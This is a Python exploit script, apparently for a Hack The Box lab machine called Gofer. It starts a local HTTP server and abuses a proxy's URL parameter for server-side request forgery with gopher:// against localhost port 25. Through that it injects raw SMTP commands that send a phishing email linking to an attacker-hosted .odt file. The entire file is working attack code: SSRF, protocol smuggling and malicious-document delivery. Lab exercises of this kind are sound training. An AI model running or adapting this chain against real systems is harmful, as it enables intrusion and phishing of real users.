#!/usr/bin/python3 
import requests
import time
from http.server import HTTPServer, SimpleHTTPRequestHandler
import threading
import sys

#Clase servidor simple
class MyRequestHandler(SimpleHTTPRequestHandler):
    def end_headers(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        super().end_headers()
    def do_GET(self):
        print(f"\n[!] Solicitud GET recibida en la ruta: {self.path}\n")
        super().do_GET()
# Definir servidor local 
def start_http_server():
    server_address = ("0.0.0.0", 8181)
    httpd = HTTPServer(server_address, MyRequestHandler)
    print(f"[+] Servidor HTTP iniciado en http://{server_address[0]}:{server_address[1]}\n ")
    httpd.serve_forever()

# Envio de correo usando la tecnica gopher
def send_mail():
    url = "http://proxy.gofer.mx/index.php?url=gopher://2130706433:25/"
    headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2",
            "Content-Type": "application/x-www-form-urlencoded"
            }
    data = "xHELO%2520gofer.htb%250AMAIL%2520FROM:%2520%253Chackmini@gofer.mx%253E%250ARCPT%2520TO:%253Cdavu@gofer.mx%253E%250ADATA%250AFrom:%2520%255BDavu%255D%2520%253Chackmini@gofer.mx%253E%250ATo:%2520%253Cdavu@gofer.mx%253E%250ADate:%2520Tue,%25207%2520Aug%25202023%252017:20:26%2520-0400%250ASubject:%2520AM%2520AM%2520AM%250A%253Ca%2520href=%2522http://10.10.14.68:8181/test.odt%2520%2522%253EThis%253C/a%253E%2520file%2520is%2520really%2520important!%250A.%250AQUIT%2520"

    url_mx = url + data
    print("\n[!] Correo ah Enviar: \n", data)

    respon = requests.post(url_mx, headers=headers)
    print("\n[+] Respuesta del servidor remoto\n",respon.text)

try:
#inicia el servidor HTTP con hilos
    http_server_thread = threading.Thread(target=start_http_server)
    http_server_thread.daemon = True
    http_server_thread.start()

#hilo para envio de correo
    email_thread = threading.Thread(target=send_mail)
    email_thread.daemon = True

    time.sleep(4)
    email_thread.start()
    time.sleep(4)
#Detener servidor o esperar la solicitud del servidor remoto
    print("\n[+] Esperando Solicitud de Descarga por Servidor Remoto...")
    input("[!] Si Desea Salir Presione ctrl + c para Detener el Script y sus Procesos\n")
except KeyboardInterrupt:
    print("\n[x] Programa Detenido por el Usuario.")
    sys.exit(0)
